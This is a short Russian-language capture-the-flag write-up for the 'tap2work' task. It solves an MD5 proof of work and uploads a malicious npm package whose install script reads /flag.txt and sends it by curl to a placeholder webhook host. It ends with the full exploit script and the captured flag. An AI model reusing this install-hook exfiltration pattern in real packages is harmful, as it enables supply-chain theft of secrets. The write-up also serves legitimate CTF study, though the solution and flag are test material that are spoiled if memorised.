# tap2work

Прочитав исходный код, понимаем что приложение реализует некий POW с хэшами и после его прохождения устанавливает отправленный приложению npm модуль.
---

Начнём с реализации прохождения pow, при get запросе на сайт сервер устанавливает в куки **challenge** челендж нашей проверки.
```
app.get('/', (req, res) => {
  req.session.challenge = uuidv4();
  res.cookie('challenge', req.session.challenge);
```
При загрузке файла POST запросом, код проверяет что md5 хеш челенджа + нашего респонса начинаеться с пяти нулей
```
if (!md5(req.session.challenge + req.body.response).startsWith('00000')) {
     result = 'POW check failed';
```
Напишем функцию которая решает POW
```
def solve_pow(challenge):
    for i in itertools.count():
        candidate = challenge + str(i)
        hash_result = hashlib.md5(candidate.encode()).hexdigest()
        if hash_result.startswith('00000'):
            return str(i)
```

---
Теперь напишем наш npm модуль, который при установке будет отправлять данные не вебхук
```
  "name": "flag",
  "version": "1.0.0",
  "scripts": {
    "install": "cat /flag.txt > /tmp/flag && curl https://webhook/flag=$(cat /tmp/flag)"
```

Запаковываем его в .gz и отправляем на сервер, ждём флаг на вебхуке

```
    tgz_file = 'flag-1.0.0.tgz'
    create_tgz(package_dir, tgz_file)

    url = 'http://tap2work.tasks.2025.ctf.cs.msu.ru/'
    session = requests.Session()

    response = session.get(url)
    challenge = session.cookies.get('challenge')

    pow_response = solve_pow(challenge)

    files = {
        'module': (tgz_file, open(tgz_file, 'rb'), 'application/gzip')
    }

    data = {
        'response': pow_response
    }

    session.post(url, files=files, data=data)
```
---
# Flag: MSKCTF{enr011_y04r_Own_cryptO_tO_npm}

